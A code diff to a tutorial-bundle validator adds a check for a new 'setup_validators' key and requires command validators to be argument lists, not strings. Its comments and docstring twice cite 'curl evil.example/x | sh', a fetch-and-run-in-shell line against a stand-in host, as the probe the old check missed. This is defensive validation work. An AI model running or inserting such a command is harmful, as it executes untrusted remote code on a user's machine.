@@ -119,6 +119,8 @@ CHECKS: dict[int, str] = {
         "can print",
     28: "every top-level field in tutorial.yaml is one this format defines; "
         "an unrecognised one WARNS",
+    29: "setup_validators entries are well-formed, name a declared validator, "
+        "and carry a describe line the banner can print",
 }
 
 BUNDLE_ONLY = {12, 13, 26}
@@ -202,6 +204,14 @@ REQUIRED_MANIFEST_FIELDS = (
 # notes on checks 3 and 20 refuse. Check 7 owns `instance:` in both
 # directions; check 28 only has to not get in its way.
 #
+# `setup_validators` is in this list and is NOT in REQUIRED_MANIFEST_FIELDS.
+# The key is a MAY: a course with no setup step declares nothing, and every
+# bundle that predates the key is valid exactly as it stands. Adding a name
+# to this allow-list is the edit that can silently disable a warning
+# wholesale, so the suite keeps a near-miss control - `setup_validator:`,
+# singular, must still warn - beside the case that proves the correct
+# spelling does not.
+#
 # `supplies` is in this list and is declared by no bundle in this repository.
 # The list is derived from the FORMAT, not from the bundles that happen to
 # exist: a list read off the fixtures would drop `supplies`, and the first
@@ -228,6 +238,7 @@ KNOWN_MANIFEST_FIELDS = (
     "ownership_policy",
     "recommended_follow_ups",
     "recommended_previous_bundles",
+    "setup_validators",
     "solution_code",
     "style",
     "subjects",
@@ -495,6 +506,25 @@ LIMITATIONS = """What a pass does and does not mean
       not its truth. It cannot tell whether the learner was really offered
       anything, really deferred it, or really finished it.
 
+  Validator commands (`kind: command`):
+    check 8 proves the SHAPE of `command` and nothing else: a non-empty list
+      whose every element is a non-empty string. A string, an empty list, a
+      mapping and a list holding a number are all findings. Before this rule
+      existed a `command` of "curl evil.example/x | sh" exited 0 with no
+      finding at all.
+    IT IS NOT A SAFETY CHECK AND MUST NEVER BE READ AS ONE. Nothing here
+      knows what the program does, whether it is installed, what it writes,
+      or whether the bundle should be trusted to name it. A green run says
+      the argument list is well formed; it says nothing whatever about
+      running it. The design this rule comes from
+      (docs/superpowers/specs/2026-09-14-validator-trust-and-setup-checks-design.md
+      section 2.1) makes "these commands have been checked" a defect in its
+      own right.
+    nothing here executes a validator, and nothing in this repository does.
+      The tutor runs the declared argument list through its own host, where
+      that host's permission layer sees it. That is the only boundary there
+      is, and moving execution into a script here would destroy it.
+
   Supplies (`supplies:`):
     an ABSENT key and a PRESENT-but-empty one (`supplies:` with nothing
       under it, or `supplies: []`) are both silent and both report "n/a" -
@@ -582,6 +612,26 @@ LIMITATIONS = """What a pass does and does not mean
     a MISSPELLED `teaching_method` (`teaching-method`, `teachingMethod`) is
       invisible to check 27, which only ever looks at the value under the
       correctly spelled key. It is CHECK 28 that names it, as a warning.
+
+  Setup validators (`setup_validators:`):
+    an ABSENT key and a PRESENT-but-empty one are both silent and report
+      "n/a", exactly as check 22 treats `supplies:`. The key is a MAY: a
+      course with no setup step declares nothing, and every bundle that
+      predates the key is valid unedited. A value that is present and is
+      neither a list nor empty IS a finding.
+    check 29 proves an entry's SHAPE - a mapping of exactly `name` and
+      `describe` - that `name` resolves in the `validators` map, that
+      `describe` is a non-empty sentence the banner can print, and that the
+      named validator is not `kind: manual`. Like check 27 and unlike check
+      22, it does not require `describe` to be one line.
+    IT MAKES NO TRUST STATEMENT WHATEVER. Declaring a validator as setup
+      says the check is the runner's to perform rather than the learner's
+      exercise. It does not say the command may run, it grants no
+      permission, and it exempts nothing from the host's own prompt - which
+      is the property that makes the declaration safe to let an author make.
+    nothing here checks whether the setup check is a good idea, whether the
+      program it names is installed, whether it will pass on this machine,
+      or what it does. Those are judgement or are unknowable here.
 
   Unrecognised top-level fields (check 28):
     check 28 is WARNINGS ONLY, in BOTH modes, and it is the only check that
@@ -894,6 +944,74 @@ def check_state_files(root: Path, mode: str, manifest: Any, report: Report) -> N
     report.ran(7, f"mode={mode}")
 
 
+def _command_shape_error(command: Any) -> str | None:
+    """Check 8's type rule for `kind: command` - the argument list's SHAPE.
+
+    `command` MUST be a non-empty list whose every element is a non-empty
+    string. The rule belongs to the claim check 8 already makes about a
+    validator definition, so it tightens that check rather than adding a
+    number; the 28 existing ids stay stable.
+
+    MEASURED 2026-09-13, repository source at `3b5a6b8`: a copy of
+    tests/fixtures/rust-cli-basics with `command: "curl evil.example/x | sh"`
+    exits 0 with no finding. Controls: the unmodified fixture exits 0;
+    `kind: comand` reports `kind 'comand' is not one of ...`; `{ kind:
+    command }` reports `kind 'command' requires the field 'command'`. The
+    probe saw check 8 findings and did not see this one, because the loop
+    above is presence-only - `if extra not in vdef` - and a string is
+    present.
+
+    WHY THE LIST IS THE RULE. `runner-protocol.md` section 2.5 says a
+    `command` validator is "the declared argument list", run in the
+    workspace root. An argument list reaches the host's tool layer as a
+    vector, where the host's own permission prompt sees each argument for
+    what it is. A single string does not: whoever runs it has to decide
+    where the words divide, and the honest way to run
+    `curl evil.example/x | sh` is through a shell, which turns one declared
+    validator into a pipeline the declaration never showed. The banner
+    `state-lifecycle.md` section 3 draws names `argv[0]` of every command
+    validator; a string has no argv[0] that can be read without guessing.
+
+    It says NOTHING about whether the program is safe to run. No check here
+    can, and `docs/superpowers/specs/2026-09-14-validator-trust-and-setup-checks-design.md`
+    section 2.1 forbids any wording that implies one did.
+    """
+    if not isinstance(command, list):
+        actual = (
+            "nothing at all - the key is written with no value under it"
+            if command is None
+            else f"{type(command).__name__}: {command!r}"
+        )
+        return (
+            f"a 'command' validator's 'command' must be a list of arguments, "
+            f"e.g. [cargo, check]; it is {actual}. The runner runs the "
+            f"declared argument list, so a single string leaves the word "
+            f"division - and the shell - to whoever runs it."
+        )
+    if not command:
+        return (
+            "a 'command' validator's 'command' is an empty list, so there is "
+            "no program to run. Name the program and its arguments, e.g. "
+            "[cargo, check]."
+        )
+    for index, item in enumerate(command):
+        if not isinstance(item, str):
+            return (
+                f"a 'command' validator's 'command' entry at position "
+                f"{index} is {type(item).__name__}: {item!r}. Every element "
+                f"of the argument list must be a string; quote it if it is "
+                f"meant to be one."
+            )
+        if item == "":
+            return (
+                f"a 'command' validator's 'command' entry at position "
+                f"{index} is an empty string. An empty argument is passed to "
+                f"the program as one, which is almost never what was meant; "
+                f"remove it."
+            )
+    return None
+
+
 def check_manifest(manifest: Any, report: Report) -> None:
     """Check 8 - required fields and validator definitions."""
     if not isinstance(manifest, dict):
@@ -962,6 +1080,10 @@ def check_manifest(manifest: Any, report: Report) -> None:
                         where,
                         f"kind {kind!r} requires the field {extra!r}",
                     )
+            if kind == "command" and "command" in vdef:
+                problem = _command_shape_error(vdef["command"])
+                if problem is not None:
+                    report.add(8, where, problem)
     report.ran(8, f"{len(REQUIRED_MANIFEST_FIELDS)} required fields")
 
 
@@ -2975,6 +3097,247 @@ def check_supplies(
     report.ran(22, detail)
 
 
+# Setup validators (check 29).
+#
+# `setup_validators` is a second list beside `validators`, at manifest scope
+# and at lesson scope, referencing the same `validators` map. It answers a
+# question the format could not ask before: is running this check part of
+# what the learner is here to learn, or is it setup the runner should carry?
+#
+# `validators` keeps exactly its present meaning - evidence of the learner's
+# work - and every bundle valid today stays valid. There is no migration.
+#
+# TWO AXES, AND THIS KEY CARRIES ONLY ONE OF THEM. Trust ("may this command
+# run on this machine at all?") is the learner's or the host's answer and
+# never the author's. Role ("is running this part of the lesson?") is the
+# author's, because nobody else knows. Declaring a validator as setup buys
+# the author NOTHING they could not already get: the host's permission
+# prompt applies to every command whatever its role, and role decides only
+# who types it afterwards and whether it counts as learner evidence. That is
+# the test that says a declaration is safe to let an author make, and it is
+# why this key is not `safe: true` in a new hat.
+#
+# `describe` is REQUIRED here and absent from `validators`, and the asymmetry
+# is the disclosure principle applied exactly where something happens
+# unprompted: a setup validator runs on the learner's behalf without being
+# asked, so it owes the same explanation `supplies.describe` owes. An
+# exercise validator does not - the lesson the learner is reading already
+# says why they are running it.
+SETUP_VALIDATORS_KEY = "setup_validators"
+SETUP_ENTRY_KEYS = ("name", "describe")
+
+
+def _setup_validator_sites(
+    manifest: Any, lessons: list[Lesson]
+) -> list[tuple[str, Any]]:
+    """Every place a `setup_validators:` key is PRESENT, as (where, raw).
+
+    The twin of _supplies_sites(), and it carries the same constraint for
+    the same reason: a key that is PRESENT but not a list is a malformed
+    declaration, not an absent one, so the raw value is returned unfiltered
+    and only the ABSENCE of the key everywhere means nothing was declared.
+    """
+    sites: list[tuple[str, Any]] = []
+    if isinstance(manifest, dict) and SETUP_VALIDATORS_KEY in manifest:
+        sites.append(("tutorial.yaml", manifest.get(SETUP_VALIDATORS_KEY)))
+    for lesson in lessons:
+        text = read_text(lesson.path)
+        if text is None:
+            continue
+        fm_text, _ = split_frontmatter(text)
+        if fm_text is None:
+            continue
+        try:
+            fm = load_yaml(fm_text, lesson.rel + " frontmatter")
+        except YamlError:
+            continue
+        if not isinstance(fm, dict):
+            continue
+        if SETUP_VALIDATORS_KEY in fm:
+            sites.append((lesson.rel, fm.get(SETUP_VALIDATORS_KEY)))
+    return sites
+
+
+def check_setup_validators(
+    manifest: Any, lessons: list[Lesson], report: Report
+) -> None:
+    """Check 29 - both modes.
+
+    One check over both scopes, following check 22's precedent for
+    `supplies`: the entries mean the same thing wherever they are declared,
+    and what scope changes is only WHEN the runner acts on them.
+
+    It runs in BOTH modes for check 27's reason - the banner that prints
+    `describe` is drawn from the INSTANCE's copy of tutorial.yaml, so an
+    instance carrying a malformed entry is as broken as a bundle carrying
+    one.
+
+    Five things are reported:
+
+      * an entry that is not a mapping of exactly `name` and `describe`;
+      * an entry carrying any other key - mirroring `supplies`, where an
+        unknown key is reported rather than ignored because it is almost
+        always a misspelling of one of the keys that belong;
+      * a `name` that resolves to nothing in the `validators` map;
+      * a `describe` that is missing, empty or blank. This is the same
+        relationship check 27 has with `teaching_method` - "a non-empty
+        sentence the banner can print" - and it is worded to match. Like
+        check 27 and unlike check 22's `describe`, it says nothing about
+        whether the sentence is ONE LINE: check 27 is the precedent the
+        design names for this field;
+      * a named validator whose kind is `manual`.
+
+    THE `manual` REFUSAL IS THE ONE PLACE THE TWO AXES CANNOT CROSS.
+    `manual` means *the learner supplies evidence; the tutor judges it* -
+    inherently the learner's work, so it cannot be something the tutor runs
+    unprompted on their behalf. `command`, `file-exists`, `file-contains`
+    and `git-diff` are all legitimate setup checks, and a `file-exists`
+    setup check is disclosed at materialization exactly as a `command` one
+    is: the disclosure principle is about what is UNPROMPTED, not about what
+    is risky.
+
+    It says NOTHING about whether the setup check is a good idea, whether
+    the program it names is installed, or whether running it is safe. Those
+    are judgement or are unknowable here, and this validator makes neither.
+    """
+    sites = _setup_validator_sites(manifest, lessons)
+
+    malformed_sites: list[tuple[str, Any]] = []
+    live_sites: list[tuple[str, list]] = []
+    for where, raw in sites:
+        if raw is None:
+            continue  # 'setup_validators:' with nothing under it
+        if isinstance(raw, list):
+            if raw:
+                live_sites.append((where, raw))
+            # else: 'setup_validators: []' - present, valid, nothing declared
+            continue
+        malformed_sites.append((where, raw))
+
+    if not malformed_sites and not live_sites:
+        report.na(29, "no bundle declares setup_validators")
+        return
+
+    validators = manifest.get("validators") if isinstance(manifest, dict) else None
+    if not isinstance(validators, dict):
+        # Check 8 already reports an unusable `validators` map. Resolving
+        # every name against an empty stand-in would turn one finding into a
+        # shower of derived ones, which is the redundancy checks 2 and 19
+        # refuse: they BLOCK instead, and so does this.
+        report.blocked(
+            29,
+            "tutorial.yaml has no usable 'validators' map, so setup_validators "
+            "names could not be resolved",
+        )
+        return
+
+    for where, raw in malformed_sites:
+        report.add(
+            29,
+            where,
+            f"'setup_validators' must be a list of entries, not "
+            f"{type(raw).__name__}. Each entry needs its own '- ' list "
+            f"marker, a 'name' naming a declared validator and a 'describe' "
+            f"line the runner says to the learner.",
+        )
+
+    checked = 0
+    for where, raw in live_sites:
+        for entry in raw:
+            checked += 1
+            if not isinstance(entry, dict):
+                report.add(
+                    29,
+                    where,
+                    f"a setup_validators entry is not a mapping of 'name' and "
+                    f"'describe', it is {type(entry).__name__}: {entry!r}. A "
+                    f"bare validator name is not enough here: a check the "
+                    f"runner performs unprompted owes the learner a sentence "
+                    f"saying why.",
+                )
+                continue
+
+            for key in sorted(set(entry) - set(SETUP_ENTRY_KEYS)):
+                report.add(
+                    29,
+                    where,
+                    f"a setup_validators entry carries an unknown key {key!r}; "
+                    f"only 'name' and 'describe' are recognised",
+                )
+
+            for key in [k for k in SETUP_ENTRY_KEYS if k not in entry]:
+                report.add(
+                    29,
+                    where,
+                    f"a setup_validators entry is missing required key {key!r}",
+                )
+
+            if "describe" in entry and not _is_text(entry.get("describe")):
+                report.add(
+                    29,
+                    where,
+                    f"a setup_validators entry's 'describe' must be a "
+                    f"non-empty sentence saying what this check confirms, in "
+                    f"the author's words; it is {entry.get('describe')!r}. The "
+                    f"runner prints it to the learner before it runs the "
+                    f"check, and telling them is the only reason the field "
+                    f"exists.",
+                )
+
+            if "name" not in entry:
+                continue
+            name = entry.get("name")
+            if not _is_text(name):
+                report.add(
+                    29,
+                    where,
+                    f"a setup_validators entry's 'name' must be a non-empty "
+                    f"string naming a validator declared in tutorial.yaml; it "
+                    f"is {name!r}",
+                )
+                continue
+            if name not in validators:
+                suggestions = near_misses(name, tuple(str(k) for k in validators))
+                hint = (
+                    f", which is a near miss for "
+                    f"{' or '.join(repr(s) for s in suggestions)}"
+                    if suggestions
+                    else ""
+                )
+                report.add(
+                    29,
+                    where,
+                    f"setup_validators names {name!r}{hint}. It is not "
+                    f"declared in tutorial.yaml's 'validators' map, so there "
+                    f"is nothing for the runner to run.",
+                )
+                continue
+            vdef = validators.get(name)
+            kind = vdef.get("kind") if isinstance(vdef, dict) else None
+            if kind == "manual":
+                report.add(
+                    29,
+                    where,
+                    f"setup_validators names {name!r}, whose kind is 'manual'. "
+                    f"A manual validator means the LEARNER supplies evidence "
+                    f"and the tutor judges it, so it is the learner's work by "
+                    f"definition and cannot be something the runner performs "
+                    f"unprompted. Every other kind may be a setup check.",
+                )
+
+    total_sites = len(live_sites) + len(malformed_sites)
+    entry_word = "entry" if checked == 1 else "entries"
+    site_word = "site" if total_sites == 1 else "sites"
+    detail = (
+        f"{checked} setup_validators {entry_word} across {total_sites} "
+        f"declaration {site_word}"
+    )
+    if malformed_sites:
+        malformed_word = "site" if len(malformed_sites) == 1 else "sites"
+        detail += f" ({len(malformed_sites)} malformed {malformed_word})"
+    report.ran(29, detail)
+
+
 # Bundle relationships (checks 23, 24, 25).
 #
 # Four optional manifest keys let a bundle say what it TEACHES, what it
@@ -3865,6 +4228,10 @@ def validate(target: Path, mode: str) -> Report:
         else set()
     ) | optional_keys
     check_supplies(target, manifest_dict, all_lessons, listed_rels, report)
+    # Check 29, both modes, and over all_lessons for check 22's reason: a
+    # generated lesson's own setup_validators entries get every
+    # well-formedness check a listed lesson's do.
+    check_setup_validators(manifest_dict, all_lessons, report)
     # Relationship metadata. All three run in BOTH modes: the four keys are
     # copied into the instance with the rest of tutorial.yaml, and a runner
     # reads `assumes` before the first task and the recommendation lists at
